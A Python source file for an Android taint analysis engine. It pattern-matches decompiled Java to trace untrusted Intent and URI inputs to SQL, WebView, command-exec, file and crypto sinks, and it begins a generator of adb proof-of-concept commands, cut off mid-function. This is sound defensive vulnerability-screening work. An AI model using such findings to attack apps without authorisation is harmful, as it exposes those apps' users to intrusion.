"""
Source-Sink Taint Analysis Engine for Android (Jadx-decompiled Java source).

Performs 2-3 hop inter-procedural taint analysis to find confirmed data flows
from untrusted inputs (Intent extras, URI segments, ContentProvider args) to
dangerous sinks (SQL, WebView, exec, file, crypto).
"""

import os
import bisect
import re
from collections import deque
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

from ..utils import Evidence, Finding


# ---------------------------------------------------------------------------
# Data-classes
# ---------------------------------------------------------------------------

@dataclass
class TaintSource:
    component_class: str      # e.g. "com.example.MainActivity"
    component_type: str       # "activity" | "service" | "receiver" | "provider"
    is_exported: bool
    method: str               # e.g. "onCreate"
    source_api: str           # e.g. "getStringExtra"
    extra_name: str           # e.g. "url" (the intent extra key, or "" when N/A)
    file_path: str
    line_number: int


@dataclass
class TaintSink:
    sink_class: str           # class containing the sink call
    sink_method: str          # method containing the sink call
    sink_api: str             # dangerous API called
    sink_type: str            # "sql" | "webview" | "exec" | "file" | "intent" | "crypto"
    severity: str             # "Critical" | "High" | "Medium"
    file_path: str
    line_number: int
    code_snippet: str


@dataclass
class TaintFlow:
    source: TaintSource
    sink: TaintSink
    hop_path: List[str]       # ["ComponentA.onCreate", "Helper.process", "DB.rawQuery"]
    is_sanitized: bool
    severity: str
    title: str
    description: str
    poc_command: str          # concrete adb command to test
    # "intra-method": tainted variable verified reaching the sink call in one method
    # "call-chain":   sink is reachable through calls, argument flow not verified
    data_flow: str = "call-chain"


_BRACE_RE = re.compile(r'[{}]')


@dataclass
class CallGraph:
    # (class, method) -> [(target_class, target_method, file, line)]
    edges: Dict[Tuple[str, str], List[Tuple[str, str, str, int]]] = field(
        default_factory=dict
    )
    # (class, method) -> full method body text
    method_bodies: Dict[Tuple[str, str], str] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Sink definitions
# ---------------------------------------------------------------------------

_SINK_PATTERNS: List[Tuple[str, str, str]] = [
    # (regex, sink_type, severity)
    # SQL
    (r'\.\s*rawQuery\s*\(', "sql", "Critical"),
    (r'\.\s*execSQL\s*\(', "sql", "Critical"),
    (r'\.\s*compileStatement\s*\(', "sql", "High"),
    (r'\.\s*query\s*\([^)]*(?:selection|where)', "sql", "High"),
    # WebView
    (r'\.\s*loadUrl\s*\(', "webview", "Critical"),
    (r'\.\s*loadData\s*\(', "webview", "High"),
    (r'\.\s*loadDataWithBaseURL\s*\(', "webview", "High"),
    (r'\.\s*evaluateJavascript\s*\(', "webview", "Critical"),
    (r'\.\s*addJavascriptInterface\s*\(', "webview", "High"),
    # Command exec
    (r'Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(', "exec", "Critical"),
    (r'new\s+ProcessBuilder\s*\(', "exec", "Critical"),
    # File
    (r'new\s+FileOutputStream\s*\(', "file", "High"),
    (r'new\s+FileWriter\s*\(', "file", "High"),
    (r'new\s+File\s*\(', "file", "Medium"),
    # Intent forwarding
    (r'\.\s*startActivity\s*\(', "intent", "Medium"),
    (r'\.\s*sendBroadcast\s*\(', "intent", "Medium"),
    # Crypto with variable key
    (r'new\s+SecretKeySpec\s*\(', "crypto", "High"),
    (r'Cipher\s*\.\s*getInstance\s*\(', "crypto", "High"),
]

_SINK_RES = {rx: re.compile(rx) for rx, _t, _s in _SINK_PATTERNS}

# Sink API display names keyed by regex prefix (used for labelling)
_SINK_DISPLAY: Dict[str, str] = {
    "rawQuery": "rawQuery",
    "execSQL": "execSQL",
    "compileStatement": "compileStatement",
    "query": "query(selection)",
    "loadUrl": "loadUrl",
    "loadData": "loadData",
    "loadDataWithBaseURL": "loadDataWithBaseURL",
    "evaluateJavascript": "evaluateJavascript",
    "addJavascriptInterface": "addJavascriptInterface",
    "exec": "Runtime.exec",
    "ProcessBuilder": "ProcessBuilder",
    "FileOutputStream": "FileOutputStream",
    "FileWriter": "FileWriter",
    "File(": "new File",
    "startActivity": "startActivity",
    "sendBroadcast": "sendBroadcast",
    "SecretKeySpec": "SecretKeySpec",
    "Cipher.getInstance": "Cipher.getInstance",
}

# Source API patterns: (regex, api_name, group_index_for_extra_name)
_SOURCE_PATTERNS: List[Tuple[str, str, int]] = [
    (r'\.get(\w+)Extra\s*\(\s*"([^"]+)"', "getExtra", 2),
    (r'\.getStringExtra\s*\(\s*"([^"]+)"', "getStringExtra", 1),
    (r'\.getIntExtra\s*\(\s*"([^"]+)"', "getIntExtra", 1),
    (r'\.getBooleanExtra\s*\(\s*"([^"]+)"', "getBooleanExtra", 1),
    (r'\.getData\s*\(\s*\)', "getData", 0),
    (r'\.getDataString\s*\(\s*\)', "getDataString", 0),
    (r'getQueryParameter\s*\(\s*"([^"]+)"', "getQueryParameter", 1),
    (r'getPathSegments\s*\(\s*\)', "getPathSegments", 0),
    (r'getLastPathSegment\s*\(\s*\)', "getLastPathSegment", 0),
    # ContentProvider – selection / selectionArgs arrive as method parameters
    (r'void\s+query\s*\([^)]*String\s+selection', "providerQuery", 0),
    (r'void\s+insert\s*\([^)]*ContentValues', "providerInsert", 0),
    (r'void\s+update\s*\([^)]*String\s+selection', "providerUpdate", 0),
]

# Sanitizer patterns by sink type. A flow is only marked sanitized when a
# matching pattern appears in the source method, the sink method, or a method
# on the path. Weak signals (TextUtils.isEmpty, length checks) are NOT
# sanitizers - they do not constrain attacker-controlled content.
_ALLOWLIST_RE = r'(?:whitelist|allowlist|allowedHosts?|ALLOWED_\w+|isAllowed\w*\s*\()'
_SANITIZERS_BY_TYPE: Dict[str, List[str]] = {
    "sql": [r'PreparedStatement', r'DatabaseUtils\.sqlEscapeString', r'\.bindString\s*\(',
            r'\bselectionArgs\b\s*[,)]', r'Pattern\.matches\s*\(', _ALLOWLIST_RE],
    "webview": [r'Uri\.encode\s*\(', r'\.getHost\s*\(\s*\)\s*\.\s*(?:equals|endsWith)\s*\(',
                r'URLUtil\.isHttpsUrl', r'startsWith\s*\(\s*"https://', _ALLOWLIST_RE,
                r'Pattern\.matches\s*\(', r'Matcher\.matches\s*\('],
    "exec": [_ALLOWLIST_RE, r'Pattern\.matches\s*\(', r'Matcher\.matches\s*\(', r'StringUtils\.escape'],
    "file": [r'getCanonicalPath\s*\(', r'\.contains\s*\(\s*"\.\."', r'\.normalize\s*\(',
             r'startsWith\s*\(', _ALLOWLIST_RE],
    "intent": [_ALLOWLIST_RE, r'setPackage\s*\(', r'setComponent\s*\(', r'resolveActivity\s*\('],
    "crypto": [],
}
_DEFAULT_SANITIZERS: List[str] = [_ALLOWLIST_RE, r'Pattern\.matches\s*\(', r'Matcher\.matches\s*\(']


# ---------------------------------------------------------------------------
# TaintEngine
# ---------------------------------------------------------------------------

class TaintEngine:
    """
    Inter-procedural source-to-sink taint analysis (max 3 hops).

    Works on Jadx-decompiled Java source files.  No real Java parser –
    regex is used throughout; results are conservative (may miss some flows
    or include false positives) but practical for security screening.
    """

    MAX_HOPS: int = 3

    def __init__(self, decompiled_root: str, manifest_data: dict):
        """
        Args:
            decompiled_root: Path to Jadx 'sources' directory (or parent).
            manifest_data: Dict produced by ReachabilityAnalyzer containing
                           components keyed by class name.
        """
        self.decompiled_root = decompiled_root
        self.manifest_data = manifest_data  # {class_name: ComponentInfo}
        self._sources_dir = self._resolve_sources_dir()
        self._package_name: str = manifest_data.get("_package", "")

        # Populated during analysis
        self._call_graph: Optional[CallGraph] = None
        # (class, method) -> file/line info for the method signature
        self._method_locations: Dict[Tuple[str, str], Tuple[str, int]] = {}
        # class -> set of imported fully-qualified names
        self._class_imports: Dict[str, Dict[str, str]] = {}
        # (class, method) -> parameter names, for argument->parameter mapping across hops
        self._method_params: Dict[Tuple[str, str], List[str]] = {}
        # simple class name -> fully qualified name
        self._class_fqn_map: Dict[str, str] = {}
        # simple class name -> every fqn with that name (filled by a pre-pass so
        # classes defined in files visited later still resolve)
        self._simple_to_fqns: Dict[str, List[str]] = {}

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def analyze(self) -> List[TaintFlow]:
        """Run full taint analysis and return all confirmed source→sink flows."""
        self._call_graph = self._build_call_graph()
        sources = self._find_taint_sources()
        sinks = self._find_sinks()

        flows: List[TaintFlow] = []
        seen: Set[str] = set()

        for source in sources:
            for flow in self._trace_taint(source, sinks, self._call_graph):
                key = (
                    f"{flow.source.component_class}.{flow.source.method}"
                    f"|{flow.sink.sink_class}.{flow.sink.sink_method}"
                    f"|{flow.sink.sink_api}"
                )
                if key not in seen:
                    seen.add(key)
                    flow.is_sanitized = self._check_sanitizers(flow)
                    flows.append(flow)

        return flows

    # ------------------------------------------------------------------
    # Call graph construction
    # ------------------------------------------------------------------

    def _resolve_sources_dir(self) -> str:
        """Locate the Java sources root within the decompiled directory."""
        candidates = [
            os.path.join(self.decompiled_root, "sources"),
            os.path.join(self.decompiled_root, "src"),
            self.decompiled_root,
        ]
        for c in candidates:
            if os.path.isdir(c):
                return c
        return self.decompiled_root

    def _build_call_graph(self) -> CallGraph:
        """
        Walk every .java file; extract method definitions and intra-/inter-class
        call sites.  Build the CallGraph edge map.
        """
        cg = CallGraph()

        # Pass 1: learn every class name so call sites can be resolved no matter
        # which file is parsed first.
        for java_file in self._iter_java_files():
            try:
                with open(java_file, "r", encoding="utf-8", errors="ignore") as fh:
                    head = fh.read(20000)
                pkg = self._extract_package(head)
                cls = self._extract_class_name(head, java_file)
                fqn = f"{pkg}.{cls}" if pkg else cls
                self._simple_to_fqns.setdefault(cls, []).append(fqn)
                self._class_fqn_map.setdefault(cls, fqn)
            except OSError:
                continue

        # Pass 2: methods and call edges
        for java_file in self._iter_java_files():
            try:
                self._process_java_file(java_file, cg)
            except Exception:
                # Gracefully skip files that cannot be parsed
                pass

        return cg

    def _iter_java_files(self):
        """Yield all .java file paths under sources dir."""
        for root, _, files in os.walk(self._sources_dir):
            for fname in files:
                if fname.endswith(".java"):
                    yield os.path.join(root, fname)

    def _process_java_file(self, file_path: str, cg: CallGraph):
        """Parse a single .java file and update the call graph."""
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read()
        except OSError:
            return

        lines = content.splitlines()

        # ── Extract package and class name ─────────────────────────────
        package = self._extract_package(content)
        class_name = self._extract_class_name(content, file_path)
        if not class_name:
            return

        fqn = f"{package}.{class_name}" if package else class_name
        self._class_fqn_map[class_name] = fqn

        # ── Extract imports (simple_name -> fqn) ──────────────────────
        imports = self._extract_imports(content)
        self._class_imports[fqn] = imports

        # ── Extract method definitions with bodies ────────────────────
        methods = self._extract_methods(content, lines, fqn, file_path)

        own_methods = {name for name, _b, _l in methods}
        var_types = self._extract_var_types(content)

        for method_name, body, start_line in methods:
            key = (fqn, method_name)
            cg.method_bodies[key] = body
            self._method_locations.setdefault(key, (file_path, start_line))

            # ── Find call sites inside this method body ────────────────
            call_sites = self._extract_call_sites(
                body, start_line, imports, fqn,
                own_methods=own_methods,
                var_types=var_types, package=package)
            if call_sites:
                cg.edges.setdefault(key, []).extend(call_sites)

    def _extract_package(self, content: str) -> str:
        m = re.search(r'^\s*package\s+([\w.]+)\s*;', content, re.MULTILINE)
        return m.group(1) if m else ""

    def _extract_class_name(self, content: str, file_path: str) -> str:
        """Extract primary class name; fall back to filename."""
        m = re.search(
            r'(?:public\s+)?(?:abstract\s+)?(?:final\s+)?class\s+(\w+)',
            content
        )
        if m:
            return m.group(1)
        # Fall back to filename
        return os.path.splitext(os.path.basename(file_path))[0]

    def _extract_imports(self, content: str) -> Dict[str, str]:
        """Return {simple_name: fqn} for all import statements."""
        result: Dict[str, str] = {}
        for m in re.finditer(r'^\s*import\s+([\w.]+)\s*;', content, re.MULTILINE):
            fqn = m.group(1)
            simple = fqn.split(".")[-1]
            result[simple] = fqn
        return result

    def _extract_methods(
        self,
        content: str,
        lines: List[str],
        class_fqn: str,
        file_path: str,
    ) -> List[Tuple[str, str, int]]:
        """
        Extract (method_name, body_text, start_line_number) for every method.

        Uses brace-counting to delimit method bodies.
        """
        results: List[Tuple[str, str, int]] = []

        # Match just `name(params) [throws X] {`. Modifiers/return types are not needed to find a
        # method and a permissive prefix made this scan quadratic on large decompiled trees.
        method_pattern = re.compile(
            r'\b(\w+)\s*\([^)]{0,1000}\)\s*'      # method name + parameters (bounded)
            r'(?:throws\s+[\w,.\s]{1,200})?\s*'
            r'\{',                                  # opening brace
        )

        line_starts = [0] + [nl.end() for nl in re.finditer(r"\n", content)]
        for m in method_pattern.finditer(content):
            method_name = m.group(1)
            # Filter out known non-method keywords
            if method_name in {
                "if", "while", "for", "switch", "try", "catch",
                "else", "do", "synchronized", "new", "return",
                "class", "interface", "enum",
            }:
                continue

            # Locate opening brace
            brace_pos = content.find("{", m.start())
            if brace_pos == -1:
                continue

            start_line = bisect.bisect_right(line_starts, m.start())

            # Count braces to find the matching close (regex jumps between braces)
            depth = 1
            pos = brace_pos + 1
            for bm in _BRACE_RE.finditer(content, pos):
                depth += 1 if bm.group() == "{" else -1
                if depth == 0:
                    pos = bm.end()
                    break
            else:
                pos = len(content)

            body = content[brace_pos:pos]
            results.append((method_name, body, start_line))
            params = self._parse_params(content[m.start():brace_pos])
            self._method_params.setdefault((class_fqn, method_name), params)

        return results

    # Generic arguments are length-bounded and matching is per line (see
    # _MAX_REGEX_LINE) so hostile `A<A<A<...` input cannot cause quadratic scans.
    _TYPE_DECL_RE = re.compile(
        r'\b([A-Z]\w{0,80})(?:<[^;(){}=\n]{0,200}>)?(?:\[\])?\s{1,8}(\w{1,80})\s{0,4}(?==|;|,|\)|:)')
    _MAX_REGEX_LINE = 2000
    _NOT_VARS = {"return", "new", "throw", "else", "case", "import", "package", "class",
                 "extends", "implements", "instanceof", "static", "final"}

    def _extract_var_types(self, content: str) -> Dict[str, str]:
        """Map variable/field/parameter name -> declared simple type (file-wide)."""
        types: Dict[str, str] = {}
        for line in content.splitlines():
            if len(line) > self._MAX_REGEX_LINE:
                continue                  # minified / generated blobs
            for m in self._TYPE_DECL_RE.finditer(line):
                type_name, var = m.group(1), m.group(2)
                if var in self._NOT_VARS or var[0].isupper():
                    continue
                types.setdefault(var, type_name)
        return types

    def _resolve_class(self, simple: str, imports: Dict[str, str], package: str) -> Optional[str]:
        """Resolve a simple class name to an fqn known to the project, else None."""
        if simple in imports:
            fqn = imports[simple]
            if fqn in self._simple_to_fqns.get(simple, []):
                return fqn
        candidates = self._simple_to_fqns.get(simple, [])
        if not candidates:
            return None
        same_pkg = f"{package}.{simple}" if package else simple
        if same_pkg in candidates:
            return same_pkg
        return candidates[0] if len(candidates) == 1 else None

    _CALL_KEYWORDS = {"if", "while", "for", "switch", "catch", "synchronized", "return",
                      "new", "throw", "super", "this", "else", "try", "do", "assert"}

    def _extract_call_sites(
        self,
        body: str,
        body_start_line: int,
        imports: Dict[str, str],
        current_class_fqn: str,
        own_methods: Optional[Set[str]] = None,
        var_types: Optional[Dict[str, str]] = None,
        package: str = "",
    ) -> List[Tuple[str, str, str, int]]:
        """
        Find all method calls in a method body.

        Resolves, in order: unqualified calls to methods of the same class,
        ``this.m()``, ``var.m()`` via the variable's declared type, and
        ``Class.m()`` via imports / same package. Calls that cannot be tied to a
        project class are dropped (they are framework/library calls).

        Returns list of (target_class_fqn, target_method, file_placeholder, line).
        """
        own_methods = own_methods or set()
        var_types = var_types or {}
        results: List[Tuple[str, str, str, int]] = []
        qualified = re.compile(r'(\w+)\s*\.\s*(\w+)\s*\(')
        unqualified = re.compile(r'(?<![\w.])(\w+)\s*\(')
        body_lines = body.splitlines()

        for line_idx, line in enumerate(body_lines):
            stripped = line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            abs_line = body_start_line + line_idx

            for cm in qualified.finditer(line):
                obj_or_class, called = cm.group(1), cm.group(2)
                if obj_or_class in {"return", "new", "if", "else", "while", "for",
                                    "throw", "catch", "super"}:
                    continue
                if obj_or_class == "this":
                    target = current_class_fqn
                else:
                    # a declared variable wins over a same-named class
                    type_name = var_types.get(obj_or_class)
                    target = self._resolve_class(type_name, imports, package) if type_name else None
                    if target is None and obj_or_class[:1].isupper():
                        target = self._resolve_class(obj_or_class, imports, package)
                if target:
                    results.append((target, called, "", abs_line))

            for um in unqualified.finditer(line):
                name = um.group(1)
                if name in self._CALL_KEYWORDS or name not in own_methods:
                    continue
                # skip "new Foo(" constructors and "Type name(" declarations
                before = line[:um.start()].rstrip()
                if before.endswith("new"):
                    continue
                results.append((current_class_fqn, name, "", abs_line))

        return results

    # ------------------------------------------------------------------
    # Taint sources
    # ------------------------------------------------------------------

    def _find_taint_sources(self) -> List[TaintSource]:
        """
        Find all reads from untrusted external sources within exported components.
        """
        sources: List[TaintSource] = []
        exported_classes = self._get_exported_classes()

        for java_file in self._iter_java_files():
            try:
                with open(java_file, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read()
            except OSError:
                continue

            package = self._extract_package(content)
            class_simple = self._extract_class_name(content, java_file)
            fqn = f"{package}.{class_simple}" if package else class_simple

            comp_info = exported_classes.get(fqn) or exported_classes.get(class_simple)
            if comp_info is None:
                continue

            comp_type, is_exported = comp_info

            lines = content.splitlines()
            current_method = "unknown"

            # Track which method we are currently inside (simple heuristic)
            method_decl_re = re.compile(
                r'(?:public|private|protected|static|final|synchronized|override)\s+'
                r'(?:[\w<>\[\],\s]+\s+)?(\w+)\s*\('
            )

            for line_no, line in enumerate(lines, start=1):
                md = method_decl_re.search(line)
                if md and md.group(1) not in {
                    "if", "while", "for", "catch", "new", "return"
                }:
                    current_method = md.group(1)

                for src_pattern, api_name, extra_grp in _SOURCE_PATTERNS:
                    for sm in re.finditer(src_pattern, line):
                        extra_name = ""
                        if extra_grp > 0:
                            try:
                                extra_name = sm.group(extra_grp)
                            except IndexError:
                                extra_name = ""

                        sources.append(TaintSource(
                            component_class=fqn,
                            component_type=comp_type,
                            is_exported=is_exported,
                            method=current_method,
                            source_api=api_name,
                            extra_name=extra_name,
                            file_path=java_file,
                            line_number=line_no,
                        ))

        return sources

    def _get_exported_classes(self) -> Dict[str, Tuple[str, bool]]:
        """
        Return {fqn: (component_type, is_exported)} for all exported components.

        Handles two manifest_data formats:
        1. Scanner format: {'activities': [{'name': fqn, 'exported': bool, ...}], ...}
        2. Legacy format:  {'com.example.Foo': {'component_type': ..., 'exported': ...}}
        """
        result: Dict[str, Tuple[str, bool]] = {}

        # Format 1 — scanner's list-based manifest_data (preferred)
        for comp_type in ("activities", "services", "receivers", "providers"):
            type_key = comp_type.rstrip("s")  # activity/service/receiver/provider
            for entry in self.manifest_data.get(comp_type, []):
                if not isinstance(entry, dict):
                    continue
                name = entry.get("name", "")
                if not name:
                    continue
                exported = bool(entry.get("exported", False))
                result[name] = (type_key, exported)
                simple = name.split(".")[-1]
                result.setdefault(simple, (type_key, exported))

        if result:
            return result

        # Format 2 — legacy class-name keyed dict
        for name, info in self.manifest_data.items():
            if name.startswith("_") or name in ("package", "activities",
                                                  "services", "receivers", "providers"):
                continue
            if hasattr(info, "component_type"):
                comp_type = info.component_type
                exported = bool(info.exported)
            elif isinstance(info, dict):
                comp_type = info.get("component_type", "activity")
                exported = bool(info.get("exported", False))
            else:
                continue
            result[name] = (comp_type, exported)
            simple = name.split(".")[-1]
            result.setdefault(simple, (comp_type, exported))

        return result

    # ------------------------------------------------------------------
    # Taint sinks
    # ------------------------------------------------------------------

    def _find_sinks(self) -> List[TaintSink]:
        """Find all dangerous API call sites in all Java files."""
        sinks: List[TaintSink] = []

        for java_file in self._iter_java_files():
            try:
                with open(java_file, "r", encoding="utf-8", errors="ignore") as fh:
                    content = fh.read()
            except OSError:
                continue

            package = self._extract_package(content)
            class_simple = self._extract_class_name(content, java_file)
            fqn = f"{package}.{class_simple}" if package else class_simple

            lines = content.splitlines()
            current_method = "unknown"

            method_decl_re = re.compile(
                r'(?:public|private|protected|static|final|synchronized|override)\s+'
                r'(?:[\w<>\[\],\s]+\s+)?(\w+)\s*\('
            )

            for line_no, line in enumerate(lines, start=1):
                md = method_decl_re.search(line)
                if md and md.group(1) not in {
                    "if", "while", "for", "catch", "new", "return"
                }:
                    current_method = md.group(1)

                if "(" not in line:
                    continue                      # every sink pattern needs a call paren
                for sink_regex, sink_type, severity in _SINK_PATTERNS:
                    if _SINK_RES[sink_regex].search(line):
                        api_name = self._label_sink(sink_regex)
                        snippet = self._build_snippet(lines, line_no)

                        sinks.append(TaintSink(
                            sink_class=fqn,
                            sink_method=current_method,
                            sink_api=api_name,
                            sink_type=sink_type,
                            severity=severity,
                            file_path=java_file,
                            line_number=line_no,
                            code_snippet=snippet,
                        ))

        return sinks

    def _label_sink(self, sink_regex: str) -> str:
        """Extract a readable sink API name from the regex."""
        for key, label in _SINK_DISPLAY.items():
            if key in sink_regex:
                return label
        # Fallback: pull first word-group from regex
        m = re.search(r'\\?\w+', sink_regex)
        return m.group(0).replace("\\", "") if m else sink_regex[:30]

    @staticmethod
    def _build_snippet(lines: List[str], line_no: int, ctx: int = 2) -> str:
        start = max(0, line_no - 1 - ctx)
        end = min(len(lines), line_no - 1 + ctx + 1)
        return "\n".join(
            f"{i + 1:04d}: {lines[i]}" for i in range(start, end)
        )

    # ------------------------------------------------------------------
    # Taint propagation (BFS, max 3 hops)
    # ------------------------------------------------------------------

    def _trace_taint(
        self,
        source: TaintSource,
        sinks: List[TaintSink],
        call_graph: CallGraph,
    ) -> List[TaintFlow]:
        """
        BFS from the source component+method through the call graph.
        Returns flows that reach a known sink within MAX_HOPS hops.
        """
        flows: List[TaintFlow] = []

        # Build a fast lookup: (sink_class, sink_method) -> [TaintSink]
        sink_index: Dict[Tuple[str, str], List[TaintSink]] = {}
        for sk in sinks:
            key = (sk.sink_class, sk.sink_method)
            sink_index.setdefault(key, []).append(sk)

        # BFS state: (class_fqn, method_name, hop_path_so_far)
        start_key = (source.component_class, source.method)
        queue: deque = deque()
        queue.append((start_key, [f"{source.component_class}.{source.method}"]))
        visited: Set[Tuple[str, str]] = {start_key}

        while queue:
            current, path = queue.popleft()

            # Check if this node is a sink location
            matching_sinks = sink_index.get(current, [])
            for sk in matching_sinks:
                flow = self._build_flow(source, sk, path)
                flows.append(flow)

            if len(path) > self.MAX_HOPS:
                continue

            # Explore callees
            for target_class, target_method, _file, _line in call_graph.edges.get(
                current, []
            ):
                next_key = (target_class, target_method)
                if next_key not in visited:
                    visited.add(next_key)
                    next_path = path + [f"{target_class}.{target_method}"]
                    queue.append((next_key, next_path))

        return flows

    def _build_flow(
        self, source: TaintSource, sink: TaintSink, path: List[str]
    ) -> TaintFlow:
        """Construct a TaintFlow from source, sink and traversal path."""
        severity = sink.severity

        # Escalate severity for exported components flowing to critical sinks
        if source.is_exported and sink.severity == "High":
            severity = "Critical"

        # Build a human-readable title
        src_label = (
            f"{source.extra_name!r} extra" if source.extra_name else source.source_api
        )
        title = (
            f"Taint flow: {source.component_type.capitalize()} "
            f"'{source.component_class.split('.')[-1]}' "
            f"{src_label} → {sink.sink_api} [{sink.sink_type.upper()}]"
        )

        hops_str = " → ".join(path)
        description = (
            f"Tainted data from {source.source_api}({src_label}) in exported "
            f"{source.component_type} '{source.component_class}' flows to "
            f"{sink.sink_api} in '{sink.sink_class}.{sink.sink_method}' via: "
            f"{hops_str}.\n\n"
            f"Sink code ({sink.file_path}:{sink.line_number}):\n"
            f"{sink.code_snippet}"
        )

        poc = self._build_poc(source, sink)

        same_method = (source.component_class == sink.sink_class
                       and source.method == sink.sink_method)
        data_flow = "call-chain"
        if same_method:
            if self._verify_intra_method_flow(source, sink):
                data_flow = "intra-method"
            else:
                # Source and sink share a method but no tainted variable reaches
                # the sink call: most likely unrelated code.
                data_flow = "unverified-same-method"
                if severity in ("Critical", "High"):
                    severity = "Medium"
        elif self._verify_call_chain(source, sink, path):
            data_flow = "call-chain-verified"      # args mapped to parameters all the way to the sink
        elif severity == "Critical":
            # Reachability alone is not proof that attacker data reaches the sink
            severity = "High"

        return TaintFlow(
            source=source,
            sink=sink,
            hop_path=path,
            is_sanitized=False,  # updated later by _check_sanitizers
            severity=severity,
            title=title,
            description=description,
            poc_command=poc,
            data_flow=data_flow,
        )


    # ------------------------------------------------------------------
    # Parameter-mapped call-chain verification
    # ------------------------------------------------------------------

    @staticmethod
    def _split_args(text: str) -> List[str]:
        """Split a call's argument text on top-level commas."""
        out, depth, cur = [], 0, []
        for ch in text:
            if ch in "([{<" and ch != "<":
                depth += 1
            elif ch in ")]}":
                depth -= 1
            if ch == "," and depth == 0:
                out.append("".join(cur)); cur = []
            else:
                cur.append(ch)
        if "".join(cur).strip():
            out.append("".join(cur))
        return [a.strip() for a in out]

    @classmethod
    def _parse_params(cls, header: str) -> List[str]:
        i = header.find("(")
        j = header.rfind(")")
        if i == -1 or j <= i:
            return []
        names = []
        for part in cls._split_args(header[i + 1:j]):
            part = re.sub(r'@\w+(?:\([^)]*\))?\s*', '', part).replace("final ", "").strip()
            mm = re.search(r'(\w+)\s*$', part)
            names.append(mm.group(1) if mm else "")
        return names

    @staticmethod
    def _uses(expr: str, tainted: Set[str]) -> bool:
        return any(re.search(rf'(?<![\w.]){re.escape(t)}\b', expr) for t in tainted)

    def _propagate(self, lines: List[str], tainted: Set[str]) -> Set[str]:
        """Grow *tainted* through ``x = <expr using tainted>`` assignments (small fixpoint)."""
        tainted = set(tainted)
        for _ in range(5):
            grew = False
            for text in lines:
                am = self._ASSIGN_LHS_RE.search(text)
                if am and am.group(1) not in tainted and self._uses(am.group(2), tainted):
                    tainted.add(am.group(1))
                    grew = True
            if not grew:
                break
        return tainted

    def _tainted_arg_positions(self, lines: List[str], callee: str, tainted: Set[str]) -> Set[int]:
        text = "\n".join(lines)
        positions: Set[int] = set()
        for cm in re.finditer(rf'(?<![\w])(?:\w+\s*\.\s*)?{re.escape(callee)}\s*\(', text):
            depth, k = 1, cm.end()
            while k < len(text) and depth:
                depth += (text[k] == "(") - (text[k] == ")")
                k += 1
            for idx, arg in enumerate(self._split_args(text[cm.end():k - 1])):
                if self._uses(arg, tainted):
                    positions.add(idx)
        return positions

    def _verify_call_chain(self, source: TaintSource, sink: TaintSink, path: List[str]) -> bool:
        """True when attacker data demonstrably flows source -> hop args -> parameters -> sink.

        Walks the hop path. In each method: propagate taint through assignments, find which
        argument positions of the next call carry tainted data, and seed the callee's
        corresponding parameters. At the sink method, the sink statement must use a tainted
        variable. Conservative: any unresolvable step returns False (stays 'call-chain')."""
        try:
            with open(source.file_path, "r", encoding="utf-8", errors="ignore") as fh:
                src_lines = fh.read().splitlines()
        except OSError:
            return False
        if source.line_number < 1 or source.line_number > len(src_lines):
            return False

        keys = []
        for hop in path:
            cls, _, meth = hop.rpartition(".")
            keys.append((cls, meth))
        cg = self._call_graph
        first = cg.method_bodies.get(keys[0])
        if first is None:
            return False

        # seed: the source call result (assigned variable and/or nested in a call argument)
        src_line = src_lines[source.line_number - 1]
        tainted: Set[str] = {"__SRC__"}
        first_lines = first.splitlines()
        marker = src_line.strip()
        am = self._ASSIGN_LHS_RE.search(src_line)
        if am:
            tainted.add(am.group(1))
        # replace the source API call text on its own line with a token so nested use is visible
        for pat, _api, _g in _SOURCE_PATTERNS:
            src_line = re.sub(pat, "__SRC__", src_line)
        first_lines = [src_line if l.strip() == marker else l for l in first_lines]
        if source.source_api.startswith("provider"):
            tainted |= {p for p in self._method_params.get(keys[0], []) if p}

        tainted = self._propagate(first_lines, tainted)
        lines = first_lines
        for cur, nxt in zip(keys, keys[1:]):
            positions = self._tainted_arg_positions(lines, nxt[1], tainted)
            params = self._method_params.get(nxt, [])
            seeds = {params[i] for i in positions if i < len(params) and params[i]}
            body = cg.method_bodies.get(nxt)
            if not seeds or body is None:
                return False
            lines = body.splitlines()
            tainted = self._propagate(lines, seeds)

        if keys[-1] != (sink.sink_class, sink.sink_method):
            return False
        try:
            with open(sink.file_path, "r", encoding="utf-8", errors="ignore") as fh:
                fl = fh.read().splitlines()
            sink_text = " ".join(fl[sink.line_number - 1:sink.line_number + 2])
        except OSError:
            return False
        return self._uses(sink_text, tainted)

    _ASSIGN_LHS_RE = re.compile(r'(?:[\w<>\[\],.?]+\s+)?(\w+)\s*=(?!=)\s*(.*)')

    def _verify_intra_method_flow(self, source: TaintSource, sink: TaintSink) -> bool:
        """Does a variable assigned from the source API reach the sink call?

        Statement-level propagation inside one method: seed the tainted set from
        the source line, grow it through ``x = <expr using tainted>``
        assignments between the source and the sink, then require the sink
        statement to use a tainted variable (or the source call itself).
        """
        try:
            with open(sink.file_path, "r", encoding="utf-8", errors="ignore") as fh:
                lines = fh.read().splitlines()
        except OSError:
            return False
        lo, hi = source.line_number, sink.line_number
        if hi < lo or lo < 1 or hi > len(lines) + 2:
            return False
        window = lines[lo - 1:hi + 2]            # +2: call arguments often wrap

        tainted: Set[str] = set()
        first = window[0] if window else ""
        m = self._ASSIGN_LHS_RE.search(first)
        if m:
            tainted.add(m.group(1))
        direct_src = first                        # source call text on the first line

        for _ in range(4):                        # small fixpoint over the window
            grew = False
            for text in window[1:]:
                am = self._ASSIGN_LHS_RE.search(text)
                if not am:
                    continue
                lhs, rhs = am.group(1), am.group(2)
                if lhs not in tainted and any(re.search(rf'\b{re.escape(t)}\b', rhs) for t in tainted):
                    tainted.add(lhs)
                    grew = True
            if not grew:
                break

        sink_stmt = " ".join(lines[hi - 1:hi + 2])
        if hi == lo:
            return True                           # source and sink on one statement
        if any(re.search(rf'\b{re.escape(t)}\b', sink_stmt) for t in tainted):
            return True
        # source call nested directly in the sink statement is covered by hi == lo
        return False

    def _build_poc(self, source: TaintSource, sink: TaintSink) -> str:
        """Generate a concrete adb command to test the flow."""
        pkg = self._package_name
        comp = source.component_class

        # Build component selector
        comp_short = comp.split(".")[-1]
        if pkg and comp.startswith(pkg):
            selector = f"{pkg}/.{comp_short}"
        elif pkg:
